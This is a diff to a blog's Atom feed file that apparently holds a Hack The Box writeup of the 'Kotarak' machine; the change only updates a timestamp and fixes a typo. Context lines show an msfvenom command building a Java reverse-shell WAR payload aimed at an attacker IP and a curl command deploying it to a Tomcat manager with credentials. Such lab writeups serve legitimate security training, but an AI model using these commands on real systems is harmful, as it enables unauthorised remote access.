@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-09-30T15:12:56+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">OmniSl4sh’s Blog</title><entry><title type="html">HTB Writeup [Linux - Hard] - Kotarak</title><link href="http://localhost:4000/2022/08/26/Kotarak.html" rel="alternate" type="text/html" title="HTB Writeup [Linux - Hard] - Kotarak" /><published>2022-08-26T00:00:00+02:00</published><updated>2022-08-26T00:00:00+02:00</updated><id>http://localhost:4000/2022/08/26/Kotarak</id><content type="html" xml:base="http://localhost:4000/2022/08/26/Kotarak.html"><![CDATA[<p><img src="/assets/Kotarak/Kotarak.png" alt="" /></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-10-05T12:46:25+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">OmniSl4sh’s Blog</title><entry><title type="html">HTB Writeup [Linux - Hard] - Kotarak</title><link href="http://localhost:4000/2022/08/26/Kotarak.html" rel="alternate" type="text/html" title="HTB Writeup [Linux - Hard] - Kotarak" /><published>2022-08-26T00:00:00+02:00</published><updated>2022-08-26T00:00:00+02:00</updated><id>http://localhost:4000/2022/08/26/Kotarak</id><content type="html" xml:base="http://localhost:4000/2022/08/26/Kotarak.html"><![CDATA[<p><img src="/assets/Kotarak/Kotarak.png" alt="" /></p>
 
 <h2 id="summary">Summary</h2>
 <ul>
@@ -197,7 +197,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> java/shell_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>10.10.16.5 <span class="nv">lport</span><span class="o">=</span>9000 <span class="nt">-f</span> war <span class="nt">-o</span> letmein.war
 </code></pre></div></div>
 
-<p>and <strong>upload the it</strong> with <code class="language-plaintext highlighter-rouge">curl</code></p>
+<p>and <strong>upload it</strong> with <code class="language-plaintext highlighter-rouge">curl</code></p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-v</span> <span class="nt">-u</span> admin:<span class="s1">'3@g01PdhB!'</span> <span class="nt">--upload-file</span> letmein.war <span class="s2">"http://kotarak:8080/manager/text/deploy?path=/shell&amp;update=true"</span>
 </code></pre></div></div>
 
